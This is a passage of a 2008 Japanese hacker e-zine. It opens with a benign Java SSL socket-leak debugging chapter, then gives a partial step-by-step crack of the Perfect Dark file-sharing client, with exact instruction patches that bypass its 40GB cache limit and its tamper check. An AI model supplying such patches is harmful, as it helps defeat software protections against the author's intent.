@@ -1,0 +1,2515 @@
+[-]=======================================================================[-]
+
+                      Wizard Bible vol.42 (2008,8,3)
+
+[-]=======================================================================[-]
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+  ---- 第0章：目次 ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+○第1章: マニアックJavaプログラミング第8回: ～ デバッギングJava ～ 金床 著
+
+○第2章: Perfect Dark Kracking                                     Will 著
+
+○第3章: 新聞勧誘員撃退のお呪い                                  理事長 著
+
+○第4章: はじめてのハッキング　～フォーマットストリング攻撃2～  Defolos 著
+
+○第5章: 逆アセンブルコードを読んでみよう                    Kenji Aiko 著
+
+○第6章: 基礎暗号学講座・第17回 ～Rabin暗号～                  IPUSIRON 著
+
+○第7章: お知らせ
+
+○第8章: 著者プロフィール
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第1章: マニアックJavaプログラミング第8回: ～ デバッギングJava ～ ---
+
+著者：金床
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　ﾎﾟｳﾝﾆﾁﾜ。今回はLinux環境でのJavaデバッグについて、実際にあった超マニア
+ックなバグを題材に解説をおこなう。このバグはJavaのSauceコードに潜んでおり、
+2月ごろから7月まで筆者を悩ませ続けていた凶悪なものである。このバグはあま
+りにもマニアックすぎて普通の人は遭遇することもないかと思うが、デバッグ手
+法そのものは他のバグつぶしや解析などにも応用がきくものである。
+
+
+■0x02.) SSL Main in the middleで発生
+
+　筆者は以前より、Wizard Bible Vol.15で紹介したようなSSLのMan in the middle
+を行うプロキシサーバーをいくつか（Doorman@JUMPERZ.NETやGuardian@JUMPERZ.NET
+など）開発しているのだが、どうもLinux環境のJava1.5や1.6でのみ動作がおかし
+いのである（1.4系列では大丈夫）。具体的には、テストで大量の通信を発生させ
+ていると、too many open filesというエラーが出始め、それっきりプロキシサー
+バーとして動作することができなくなってしまう、というものだ。
+
+　too many open filesときいて「ああ、アレか…」と思った読者もいるだろう。
+Linuxでは1つのプロセスが開くことのできるファイルディスクリプタ（Windowsで
+はハンドルと呼ばれる概念）の最大数が決まっており、デフォルトでは1024など
+の値が用いられる。この値はカーネルのヘッダファイルの書き換えやシェルのビ
+ルトインコマンドであるulimitなどで変更することができる。
+
+　ｿｹｯﾄもファイルディスクリプタとして扱われるため、ネットワークサーバーが
+このエラーを発生させてしまう場合はｿｹｯﾄが確保できないために事実上ｻｰﾋﾞｽが停
+止してしまうことになり、緊急事態と言える。筆者が作っていたサーバーはこの
+エラーのためにある時点で使い物にならなくなってしまうため、「長時間安定稼
+働させる」という目標が達成できず困っていた。
+
+
+■0x03.) ファイルディスクリプタを調べる
+
+　そんなわけでデバッグが始まった。まず最初に「たまたま、一時的にたくさん
+のファイルディスクリプタを使っているだけである」というかなり願望が入った
+仮説を立ててみた。この場合、一時的に使用しているファイルディスクリプタの
+総数が1024を超えているだけということになるので、この数に余裕を持たせてや
+ればいい。具体的にはulimit -n 100000などとすれば、10万ものファイルディス
+クリプタを扱えることになる（環境によってはulimitだけでなく/etc/security/
+limits.confの設定やｶｰﾈﾙの作り直しが必要なケースもあるようなので要注意）。
+しかし結果は残念ながら、サーバーが死ぬまでの時間が長くかかるだけであった。
+
+　そのため今度はlsofコマンドによって実際にプロセスが使用しているファイル
+ディスクリプタの一覧を出力してみることにした。すると次のような奇妙な行が
+大量に（1000行くらい）出力された。
+
+-----
+java    1919 root  884u  sock    0,5            10398 can't identify protocol
+java    1919 root  885u  sock    0,5            10399 can't identify protocol
+java    1919 root  886u  sock    0,5            10418 can't identify protocol
+java    1919 root  887u  sock    0,5            10420 can't identify protocol
+java    1919 root  888u  sock    0,5            10422 can't identify protocol
+java    1919 root  890u  sock    0,5            10443 can't identify protocol
+java    1919 root  891u  sock    0,5            10444 can't identify protocol
+java    1919 root  892u  sock    0,5            10445 can't identify protocol
+java    1919 root  893u  sock    0,5            10446 can't identify protocol
+java    1919 root  894u  sock    0,5            10447 can't identify protocol
+java    1919 root  895u  sock    0,5            10448 can't identify protocol
+-----
+
+　なんとも激しく微妙で、「リークしているのは（ファイルではなく）ｿｹｯﾄであ
+る」「何個のｿｹｯﾄがﾘｰｸしている」程度の情報しか読みとることができない。ﾘｰｸ
+するｿｹｯﾄの数は一定せず、また起動後しばらくは正常なのだが、あるときからﾘｰ
+ｸが発生するなど、なかなかﾘｰｸの挙動が安定していない。
+
+　そこでとりあえず自分のコードを再度見直し、ｿｹｯﾄ系のリソースリークが無い
+かどうか隅々まで検討してみた。しかし結果はナシ。最終的にこのバグが発生す
+る非常に小さなコードにまで落とし込んでみて、このリークが自分のせいではな
+く、Java側であるという確信を持つことになった。このバグが再現可能なソース
+は以下のようなものだ。
+
+-----
+import java.net.*;
+import javax.net.*;
+import javax.net.ssl.*;
+
+public class test1
+{
+private static ServerSocketFactory ssf;
+//------------------------------------------------
+public static void main( String[] args )
+throws Exception
+{
+ssf = SSLServerSocketFactory.getDefault();
+for( int i = 0; i < 1000; ++i )
+        {
+        foo();
+        }
+Thread.sleep( 1000000 );
+}
+//------------------------------------------------
+private static void foo()
+throws Exception
+{
+ServerSocket sSocket = ssf.createServerSocket( 0, 1 );
+Socket socket1  = new Socket( "127.0.0.1", sSocket.getLocalPort() );
+Socket socket2 = sSocket.accept();
+sSocket.close();
+socket1.close();
+socket2.close();
+}
+//------------------------------------------------
+}
+-----
+
+　SSLSocketFactoryを使うため、起動時には.keystoreファイルを用意する必要が
+ある。起動は次のようなコマンドで行う（パスワードは仮にchangeitとする）。
+
+-----
+java -Djavax.net.ssl.keyStore=.keystore -Djavax.net.ssl.keyStorePassword=changeit test1
+-----
+
+　このバグを追いかけるため、この段階までに非常に多くの時間を費やしてしま
+った。しかも自分のコードの修正では対応できなさそうである。ここ数年遭遇し
+たバグの中でも、かなりやっかいなものになる予感がしていた。
+
+
+■0x04.) システムコールをトレースする
+
+　再現するコードを作成することができたので、2008年2月頃にSun(http://bugs
+.sun.com/)に報告してみたのだが、まるっきり音沙汰がない。後からわかったこ
+とだが、どうもOpenJDK化のごたごたなどで、Javaについてのバグ報告先がhttp:
+//bugs.sun.com/からメーリングリストを主体とする体制に移行していたようであ
+る。例えばSSL関連のメーリングリストはhttp://mail.openjdk.java.net/mailman
+/listinfo/security-devとなる。
+
+　Sunからまったく反応がないためこのバグについてはしばらく放置していたのだ
+が、あるとき別のネタ（VMware系）をごそごそしているときに、straceという超
+便利なコマンドを知ってしまった。これはLinux上でシステムコールをログに取る
+ことができるツールで、CentOSならばyum install straceでインスコすることが
+できる。例えばlsコマンドの動作を調べるには
+
+-----
+strace ls
+-----
+
+　とするだけだ。まぁぶっちゃけ「今まで知らなかったのかよｱﾘｴﾅｽ」ﾚﾍﾞﾙで必須
+ｺﾏﾝﾄﾞであるstrace。フック系にしては動作も安定していてかなり良い感じだ。と
+りあえずリークしているsocket関係の関数でも見てみるか、というつもりでこの
+test1クラスについてもstraceしてみることにした。
+
+　Javaのアプリケーションはデフォルトでマルチスレッドなので（たとえばgcを
+行うスレッドなどが独立している）、straceできれいにログを取るには-oオプシ
+ョンと-ffオプションを組み合わせるといい感じである。
+
+-----
+strace -o log -ff java -Djavax.net.ssl.keyStore=.keystore -Djavax.net.ssl.keyStorePassword=changeit test1
+-----
+
+　このようにすると、それぞれのスレッドについて「PID.log」といった感じのロ
+グファイルが生成される。
+
+
+■0x05.) あやしい箇所ﾊｯｹｿ
+
+　複数生成されたﾄﾚｰｽﾛｸﾞﾌｧｲﾙをgrep -li socketしてみると、2つのﾌｧｲﾙだけがヒ
+ットする。片方はJavaアプリケーションのメインのスレッドで、片方はいまいち
+よくわからないものだ。そして後者のファイルに非常にあやしい箇所を発見した。
+
+-----
+13:43:13.511753 socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 15
+13:43:13.511794 getsockopt(15, SOL_SOCKET, SO_LINGER, {onoff=0, linger=0}, [8]) = 0
+13:43:13.511933 --- SIGSEGV (Segmentation fault) @ 0 (0) ---
+13:43:13.511967 rt_sigreturn(0x2aaaab551544) = 0
+13:43:13.512082 socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 16
+13:43:13.512124 getsockopt(16, SOL_SOCKET, SO_LINGER, {onoff=0, linger=0}, [8]) = 0
+13:43:13.512164 --- SIGSEGV (Segmentation fault) @ 0 (0) ---
+13:43:13.512198 rt_sigreturn(0x2aaaab551544) = 0
+13:43:13.512271 socket(PF_INET, SOCK_STREAM, IPPROTO_IP)       = 17
+13:43:13.512327 getsockopt(17, SOL_SOCKET, SO_LINGER, {onoff=0, linger=0}, [8]) = 0
+13:43:13.512502 --- SIGSEGV (Segmentation fault) @ 0 (0) ---
+13:43:13.512544 rt_sigreturn(0x2aaaab551544) = 0
+13:43:13.512665 socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 19
+13:43:13.512705 getsockopt(19, SOL_SOCKET, SO_LINGER, {onoff=0, linger=0}, [8]) = 0
+13:43:13.512820 --- SIGSEGV (Segmentation fault) @ 0 (0) ---
+13:43:13.512853 rt_sigreturn(0x2aaaab551544)
+-----
+
+　このようなログがえんえんと続いているのだ。「Segmentation fault」ってお
+かしくね？変じゃね？という感じである。そして決定的なことに、このSegmenta
+tion faultの数が、lsofで調べることができる、「リークしているｿｹｯﾄの数」と
+一致したのである。怪しすぎるぞ(`Д´)ノｺﾞﾗｧ!!!
+
+　しかしSegmentation faultが起こっているのにﾌﾟﾛｾｽが落ちないというのが不思
+議である。シグナルをトラップしているのだろうか。このファイルの2行目にある
+
+-----
+13:43:12.655353 rt_sigprocmask(SIG_UNBLOCK, [ILL BUS FPE SEGV USR2], NULL, 8) = 0
+-----
+
+　という行が猛烈に関係ありそうだがよくわからない（誰か教えてくだちい）。
+
+
+■0x06.) Nullﾎﾟﾊｯｹｿ
+
+　さて動作し続けているアプリケーション内部でSegmentation faultが発生して
+いるという異常事態なので、改めてJavaアプリデバッグの基本に返り、-Xrunhpr
+ofオプションで関数のトレースを見てみることにした。最近知ったことだが、-X
+runhprofオプションを使う場合には次のようにdepthオプションを指定すると非常
+に便利である。
+
+-----
+java -Xrunhprof:thread=y,depth=50 test
+-----
+
+　depthの数は「何階層までトレースするか」を決める。例えばdepth=3にすると、
+ダンプされる出力は次のように短いものになる。
+
+-----
+TRACE 300013: (thread=200001)
+        java.lang.StringCoding$StringDecoder.decode(StringCoding.java:133)
+        java.lang.StringCoding.decode(StringCoding.java:173)
+        java.lang.String.<init>(String.java:444)
+TRACE 300014: (thread=200001)
+        java.nio.Buffer.<init>(Buffer.java:172)
+        java.nio.ByteBuffer.<init>(ByteBuffer.java:259)
+        java.nio.HeapByteBuffer.<init>(HeapByteBuffer.java:52)
+TRACE 300015: (thread=200001)
+        java.nio.Buffer.<init>(Buffer.java:172)
+        java.nio.CharBuffer.<init>(CharBuffer.java:259)
+        java.nio.HeapCharBuffer.<init>(HeapCharBuffer.java:52)
+-----
+
+　これを大きな数（例えば50）にすると次のようになる。
+
+-----
+TRACE 300014: (thread=200001)
+        java.lang.StringCoding$StringDecoder.decode(StringCoding.java:133)
+        java.lang.StringCoding.decode(StringCoding.java:173)
+        java.lang.String.<init>(String.java:444)
+        java.lang.String.<init>(String.java:516)
+TRACE 300015: (thread=200001)
+        java.nio.Buffer.<init>(Buffer.java:172)
+        java.nio.ByteBuffer.<init>(ByteBuffer.java:259)
+        java.nio.HeapByteBuffer.<init>(HeapByteBuffer.java:52)
+        java.nio.ByteBuffer.wrap(ByteBuffer.java:350)
+        java.lang.StringCoding$StringDecoder.decode(StringCoding.java:137)
+        java.lang.StringCoding.decode(StringCoding.java:173)
+        java.lang.String.<init>(String.java:444)
+        java.lang.String.<init>(String.java:516)
+TRACE 300016: (thread=200001)
+        java.nio.Buffer.<init>(Buffer.java:172)
+        java.nio.CharBuffer.<init>(CharBuffer.java:259)
+        java.nio.HeapCharBuffer.<init>(HeapCharBuffer.java:52)
+        java.nio.CharBuffer.wrap(CharBuffer.java:350)
+        java.nio.CharBuffer.wrap(CharBuffer.java:373)
+        java.lang.StringCoding$StringDecoder.decode(StringCoding.java:138)
+        java.lang.StringCoding.decode(StringCoding.java:173)
+        java.lang.String.<init>(String.java:444)
+        java.lang.String.<init>(String.java:516)
+-----
+
+　50というのは「最大で50階層」という意味なので、このように普通のトレース
+はすべて出力されることになる。関数の呼び出しが非常に深いアプリケーション
+の場合などには100や200などの数値を指定すればよい。depthのデフォルト値は4
+であるが、これは小さすぎる気がする。
+
+　さてこのようにして再度test1のJavaﾄﾚｰｽを取り、さらにSegmentation faultが
+起こっているとのことで例外（Exception）をｷｰﾜｰﾄﾞに検索していたところ、次の
+ﾄﾚｰｽを見つけた。
+
+-----
+TRACE 307528: (thread=200004)
+        java.lang.Throwable.<init>(Throwable.java:197)
+        java.lang.Exception.<init>(Exception.java:46)
+        java.lang.RuntimeException.<init>(RuntimeException.java:49)
+        java.lang.NullPointerException.<init>(NullPointerException.java:53)
+        sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:314)
+        sun.security.ssl.OutputRecord.write(OutputRecord.java:303)
+        sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:761)
+        sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:746)
+        sun.security.ssl.SSLSocketImpl.sendAlert(SSLSocketImpl.java:1722)
+        sun.security.ssl.SSLSocketImpl.warning(SSLSocketImpl.java:1571)
+        sun.security.ssl.SSLSocketImpl.closeInternal(SSLSocketImpl.java:1373)
+        sun.security.ssl.SSLSocketImpl.close(SSLSocketImpl.java:1312)
+        sun.security.ssl.BaseSSLSocketImpl.finalize(BaseSSLSocketImpl.java:249)
+        java.lang.ref.Finalizer.invokeFinalizeMethod(Finalizer.java:Unknown line)
+        java.lang.ref.Finalizer.runFinalizer(Finalizer.java:101)
+        java.lang.ref.Finalizer.access$100(Finalizer.java:32)
+        java.lang.ref.Finalizer$FinalizerThread.run(Finalizer.java:178)
+-----
+
+　なんとNullﾎﾟが、しかもSSLSocketの内部で発生しているではないか。また、ﾄ
+ﾚｰｽのﾄｯﾌﾟを見るとFinalizerというｷｰﾜｰﾄﾞがあり、これがGCスレッドによって引
+き起こされていることがわかる。straceによってSegmentation faultが発見され
+ていたスレッドは、メインスレッドではなくGCスレッドだったのである。
+
+　ﾌｧｲﾙﾃﾞｨｽｸﾘﾌﾟﾀを閉じるためのｺｰﾄﾞの途中でNULLﾎﾟが発生しているため、ﾘｰｸが
+発生する。一方でGCｽﾚｯﾄﾞというのは処理の途中で例外が発生しても無視するとい
+う仕様なので、ｱﾌﾟﾘｹｰｼｮﾝは動作を続けてしまう。
+
+　GCがいつ発生するかはその時々で異なるため、リークが発生するタイミングな
+どが安定していなかったことにも納得がいった。
+
+
+■0x07.) Javaのｿｰｽｺｰﾄﾞを読む
+
+　さて怪しい箇所（OutputRecord.javaの314行目あたり）がわかったので、ｿｰｽｺ
+ｰﾄﾞを読んでみることにする。筆者が以前ﾀﾞｳﾝﾛｰﾄﾞしたJavaのｿｰｽには輸出制限の
+関係からかSSLまわりのｸﾗｽが含まれていなかったのだが、現在OpenJDKのｻｲﾄから
+ﾀﾞｳﾝﾛｰﾄﾞできるｿｰｽにはSSLまわりのｸﾗｽもすべて含まれている（素晴らしい！）。
+
+　筆者はｿｰｽｺｰﾄﾞを読むときにprintfデバッグしながらでないと読めない人である
+ので、ついでに少し頑張ってOpenJDKをビルドする環境を整えてみた。CentOS5に
+いくつかのライブラリをインストールし、またOpenJDKのドキュメントにあるよう
+にいくつかの環境変数などを設定することで、手元のLinux上でJDKがビルドでき
+るようになる。筆者はこのようなインストール作業が苦手なのだが、今回は運良
+く半日ほどで無事にビルド環境を整えることができた。
+
+　Nullﾎﾟが発生している箇所は、以下のｺｰﾄﾞだった。
+
+-----
+    void writeBuffer(OutputStream s, byte [] buf, int off, int len)
+            throws IOException {
+        s.write(buf, off, len);
+        s.flush();
+-----
+
+　sがNULLの状態でこの関数（writeBuffer）が呼び出されているのである。そこ
+で、筆者は次のようなﾊﾟｯﾁを作成した。
+
+-----
+*** src/share/classes/sun/security/ssl/OutputRecord_orig.java   2008-07-09 01:54:02.000000000 +0900
+--- src/share/classes/sun/security/ssl/OutputRecord.java        2008-07-09 01:53:50.000000000 +0900
+***************
+*** 311,316 ****
+--- 311,317 ----
+       */
+      void writeBuffer(OutputStream s, byte [] buf, int off, int len)
+              throws IOException {
++       if(s == null) return;
+          s.write(buf, off, len);
+          s.flush();
+-----
+
+　「sがNULLだったらreturnする」という、まさに付け焼き刃。ｽｰﾊﾟｰﾊｶｰも真っ青、
+ﾊﾟｯﾁ中のﾊﾟｯﾁである。どうせ行っている処理はGCの中でのｿｹｯﾄのｸﾛｰｽﾞ処理なので、
+けっこう適当でもいいんじゃね？というのと、とにかくﾘｰｸしないようにしたかっ
+たのでこのようなﾊﾟｯﾁを作成した。
+　動作を確認してみたところ、無事ﾘｰｸが収まっている。ひどいﾊﾞｸﾞだったので、
+このﾊﾟｯﾁによってﾘｰｸが収まることを確認した際はｶﾞｯﾂﾎﾟｰｽﾞが飛び出した。
+
+
+■0x08.) 原因究明
+
+　さてこの「ﾊﾟｯﾁかくあるべし」というﾊﾟｯﾁをメーリングﾘｽﾄに投稿したところ、
+やはりﾀﾞﾒだしを食らった。なぜNULLになるのかﾁｪｯｸすべきだ、ということである。
+正論すぎてｸﾞｩの音も出ません。ということで、SSLの処理はややこしそうなので
+たぶんわからないだろうな、と思いつつｿｰｽをさらに見ていくことにした。
+
+　ﾄﾚｰｽを追ってみると、writeBufferでNULLになっているOutputStreamのsはSSLS
+ocketImplのsockOutputであることがわかる。問題が起こる箇所のひとつであるS
+SLSocketImplｸﾗｽのcloseInternalにprint文を埋め込み、sockOutputを出力させて
+みると、やはりNULLとなっている。SSLSocketImplｸﾗｽには非常に重要な働き（SS
+Lの状態の管理）を行うと思われるconnectionStateという変数が存在するため、
+この変数も同時に追ってみた。埋め込んだprint文は次のようなものだ。
+
+-----
+System.out.println( this + " " + connectionState + " " + sockOutput + " " + isConnected() + " " + isClosed() );
+-----
+
+　connectionStateはｲﾝｽﾀﾝｽが作成されたときにはcs_START（値は0）なのだが、
+ﾘｰｸを起こす時点ではcs_HANDSHAKE（値は1）になっていることがわかった。そこ
+でconnectionStateを書き換えている箇所を探してみると、initHandshakerという
+関数の中に次のような箇所を発見した。
+
+-----
+        if (connectionState == cs_START) {
+            connectionState = cs_HANDSHAKE;
+-----
+
+　そこでさらにinitHandshakerにも同じようなprint文を仕込んでみると、sockO
+utputがNULLの場合とそうでない場合があることがわかった。ここで知りたいのは
+sockOutputがNULLの場合にinitHandshakerがどこから呼び出されているのか？と
+いうことである。単純なprint文の埋め込みでは、ｺｰﾄﾞがどこから呼び出されてい
+るのかはわからない。そこで、例外のｽﾀｯｸﾄﾚｰｽを使うことにした。
+
+-----
+    ( new Exception() ).printStackTrace();
+        System.out.println( this + ">>> " + getConnectionState() + " " + sockOutput + " " + isConnected() + " " + isClosed() );
+-----
+
+　このようなｺｰﾄﾞを埋め込むと、例外が発生し、同時にｽﾀｯｸﾄﾚｰｽがｴﾗｰ出力に吐き
+出される。このためｺｰﾄﾞがここを通るたびに「どの関数から呼び出されているの
+か」をすべてたどることができ、激しく便利である。printfﾃﾞﾊﾞｯｶﾞｰがJavaをい
+じる際には必須のテクニックと言えるだろう。
+
+　このstackTraceデバッグにより、無事に原因が解明された。なんとSSLSocketI
+mplはSSLServerSocketImplから変な風に呼び出されており、このときsockOutput
+は（インスタンスの寿命の）最初から最後までNULLのままなのである。呼び出さ
+れている箇所は以下のとおりだ。
+
+-----
+            SSLSocketImpl tmp = new SSLSocketImpl(sslContext, useServerMode,
+                         enabledCipherSuites, doClientAuth,
+                         enableSessionCreation, enabledProtocols);
+
+            ServerHandshaker handshaker = tmp.getServerHandshaker();
+-----
+
+　このtmpｲﾝｽﾀﾝｽはServerHandshakerクラスのインスタンスを得るためだけに利用
+されており、実際のSSL通信を行わない。最初から最後までsockOutputはNULLであ
+るにもかかわらず、GCの際に呼び出されるcloseの中においてsockOutputを利用し
+ようとしてしまっていたのである。
+
+　SSLServerSocketを利用するときには必ずこのｺｰﾄﾞが実行されるため、例えばT
+omcatなどでSSLｿｹｯﾄを使っている場合には必ず1つのｿｹｯﾄがﾘｰｸしているはずだ。
+lsofｺﾏﾝﾄﾞを使えばcan't identify protocolな状態のｿｹｯﾄを見つけることができ
+るだろう。
+　しかしごく普通のｱﾌﾟﾘｹｰｼｮﾝではSSLServerSocketのｲﾝｽﾀﾝｽは1つで済む（たとえ
+ば443番ﾎﾟｰﾄを開けるだけ）ため、ﾘｰｸするﾌｧｲﾙﾃﾞｨｽｸﾘﾌﾟﾀはたった1つであり、事
+実上これは問題にはならない。
+
+　以上をメーリングﾘｽﾄに報告したところ、無事対応が期待できそうなﾚｽﾎﾟﾝｽを得
+ることができた。本稿執筆時点ではまだｱｯﾌﾟﾃﾞｰﾄは行われていないが、遅くとも
+数ヶ月後には対応が行われることだろう。
+
+
+■0x09.) まとめ
+
+　さて今回は個人的に大事件だったﾌｧｲﾙﾃﾞｨｽｸﾘﾌﾟﾀﾘｰｸ事件を題材にJavaデバッギ
+ングの様子を見てみた。まとめは以下のようになる。
+
+・straceで-ffオプションにより各スレッドをトレースすると便利杉
+・javaの-Xrunhprofではdepthに大きな数を指定するのが必須テク
+・javaのトレースを取ったら変な例外が発生していないか探すといいことあるカモ
+・javaのprintfデバッグを行う際には例外をnewしてその場でprintStackTraceする
+と便利すぎて失禁しる
+
+　他にも便利なデバッグ技があったら是非教えてくだきい！
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第2章: Perfect Dark Kracking ---
+
+著者：Will
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　Perfect Darkとは
+
+-----　http://ja.wikipedia.org/wiki/Perfect_Darkから引用
+　Perfect darkはWindowsで動作する匿名ファイル共有ソフトである。会長と名乗
+る匿名の作者によって開発中であり、最終的にはWinnyやShareの後継となりうる
+ものを目指している。PDと略されることも多い。 現在、公開テスト中である。
+-----
+
+　このソフトウェアにはファイル共有機能だけでなくフローやボードといった匿
+名性に優れた簡易掲示板機能がある訳だが、たとえフローやボードを使う目的で
+Perfect Darkを導入するにしても、Unity(キャッシュ)フォルダとして最低でもH
+DDの空き容量が40GBは必要である。
+　というわけで、実行ファイルの改変によってこの40GB制限を解除しようという
+のが今回の解析の目的である。
+　なお、パッチの違法目的での使用はご遠慮ください。
+
+
+■0x02.) 準備
+
+　今回の解析で使用するソフトウェアは以下の通りです。
+
+・OllyDbg
+・IDA Pro 4.9 Freeware
+・うさみみハリケーン
+・Perfect Dark 1.02（ターゲット）
+
+
+■0x03.) 40GB制限を回避しよう
+
+　それではテンポ良く解析していきましょう。
+
+1：Unityサイズを保持している変数のアドレスを探そう。
+
+　まずはOllyDbgでperfect dark.exeを開き、実行させます。
+　次にうさみみハリケーンを実行し、実行中のperfect dark.exeにアタッチしま
+す。Vistaの場合はどちらのソフトウェアも管理者権限で実行しないと正常な動作
+をしないので注意してください。
+　そしてメニューバーの「検索」→「メモリ範囲を指定して検索」を押します。
+通常検索という項目があるので「数値」の右にあるテキストボックスに今現在の
+Unityのサイズを入力し、「通常検索実行」というボタンを押すと右上のリストボ
+ックスに検索結果が表示されます。
+　このままでは候補が多すぎるのでPerfect Darkを操作してUnityのサイズを変更
+し、再びその値をテキストボックスに入力して検索、というのを繰り返して候補
+が一つになるまで繰り返します。
+　一つだけ残ったのが今現在のUnityの大きさを保持しているアドレスです。メモ
+してください。
+　それではうさみみハリケーンを終了して、次にOllyDbgの方で作業を続けます。
+
+2：Unityサイズを保持している変数にアクセスしている箇所を探そう。
+
+　OllyDbgの左下のDump画面内で右クリック→「移動」→「アドレス移動」を押し
+て先ほどメモしたアドレスを入力します。すると今現在のUnityサイズの値が16進
+数で表示されているのが確認できると思います。
+　次に、ここにアクセスしている箇所を探すためにブレークポイントをセットし
+ます。値の上で右クリック→「ブレークポイント」→「HWブレークポイント書き
+込み」→「byte」を押すとハードウェアブレークポイントがセットされます。
+　そしてPerfect Darkの方で再びUnityサイズを変更し、Okを押すと以下の場所で
+ブレークします。
+
+-----
+0040DF5B   .  E8 90E4FFFF   CALL perfect_.0040C3F0
+-----
+
+　しかし、ハードウェアブレークポイントは一つ行き過ぎるという特徴があるの
+で、実際には以下の命令が先ほどのアドレスにアクセスしています。
+
+-----
+0040DF55   .  8981 78020000 MOV DWORD PTR DS:[ECX+278],EAX
+-----
+
+　とりあえずハードウェアブレークポイントを解除して0x0040DF55にブレークポ
+イントをセットしてもう一度さっきと同様にUnityサイズを変更すると0x0040DF55
+でブレークします。このときのEAXの値が変更する値で、DS:[ECX+278]が変更前の
+値であるのが確認できると思います。つまり、このEAXをチェックしている箇所を
+探すことで40GB制限を回避できるわけです。
+　と言うわけで、その少し上のコードを見てみましょう。MessageBoxを呼び出し
+ている箇所があるのかすぐに見つかると思います。これが設定した値が40GB未満
+の場合にエラーとして表示されるものだと言うことは容易に想像がつくでしょう。
+ということはこの処理より前の比較でチェックしているというのも分かります。
+それが以下の命令です。
+
+-----
+0040DEE6   .  3BC6          CMP EAX,ESI
+-----
+
+　というわけで、その下の項目を以下のように変更します。
+
+-------
+0040DEE8   . /EB 5E         JMP SHORT perfect_.0040DF48
+-------
+
+　ブレークポイントを外してから再開させて、Unityサイズを40GB以下にしてもエ
+ラーが出ずに値が更新されているのが確認できるでしょう。
+　最後に変更を実行ファイルに書き込み、解析終了です。お疲れ様でした。とい
+いたいんですがね。
+
+
+■0x04.) 改変チェックを回避しよう
+
+　というわけで、変更した実行ファイルを実行してもすぐに終了します。つまり
+改変チェックが存在するという事です。
+　それではサクっと回避しちゃいましょう。
+　まずはIDA Proでperfect dark.exeを開きます。分析が終了するまで暫く待ちま
+しょう。実行してもウインドウが表示されないので、そこらあたりから攻めてい
+きます。Importウインドウの中のCreateWindowEXの項目をダブルクリックをする
+と
+
+-----
+idata:004CE3D8　…
+-----
+
+　というところに移動します。CreateWindowEXのところで右クリック→「jump to
+ xref to operand」を押すと多くの項目が表示されますが、これの一番上をダブ
+ルクリックします。周りのコードを見るとここがメインのウインドウを作成して
+いる箇所であるのが確認できると思います。
+　それでは次にメニューバー「View」→「graph」→「Flow chart」を押します。
+すると今の箇所を含めたフローチャートが表示されます。ここからが面倒なので
+すが、改変前と改変後の実行ファイルをこのフローチャートを見ながらデバッグ
+していきます。
+　そして、どこで違いが生じるかをチェックします。結果は以下の箇所で、改変
+後の場合は、ジャンプしてしまいます。
+
+-----
+text:0040A1B0                 jnz     loc_40A3FB
+-----
+
+というわけで、試しにこれを飛ばないように変更して実行すると、なぜかソフ
+トが落ちます。
+　しょうがないのでその前の
+
+-----
+.text:0040A1A6                 call    sub_40AA20
+-----
+
+　この中もチェックすることにします。ここでもフローチャートを表示させてか
+ら、改変前と改変後の実行ファイルの違いをチェックしていきます。結果は以下
+の箇所で、改変後の場合は、ジャンプしません。
+
+-----
+text:0040AB6A                 jz      short loc_40ABCA
+-----
+
+　というわけで、その前の
+
+-----
+.text:0040AB63                 call    sub_4628B0
+-----
+
+この中をさらに調べます。CreateFileWやReadFile関数などを使って改変チェック
+をしているのが分かると思います。
+　というわけで以下のように変更することで改変チェックを回避します。
+
+-----
+.text:0040AB68                 cmp    eax, eax
+-----
+
+　すると改変後の実行ファイルでも実行できるようになりました。
+　お疲れ様でした。といいたいんですがね。
+
+
+■0x05.)　起動時にUnityサイズを設定させる
+
+　実行してもらったら分かるんですが、起動時のUnityサイズは40GBで変更すると
+40GB以下になります。これはちょっと…って感じです。
+　というわけで適当なところにUnityサイズを設定するコードを作成します。取り
+敢えず、改変チェック後に入れてみました。まずは以下のように変更して、空い
+てる場所までジャンプさせます。
+
+-----
+0040AD6A   . /E9 BC120C00   JMP perfect_.004CC02B
+-----
+
+　そして、変更によってつぶれた命令とUnityサイズを設定するコードを書き加え
+ます。取り敢えず、設定するサイズは7GBにしてみました。
+
+-----
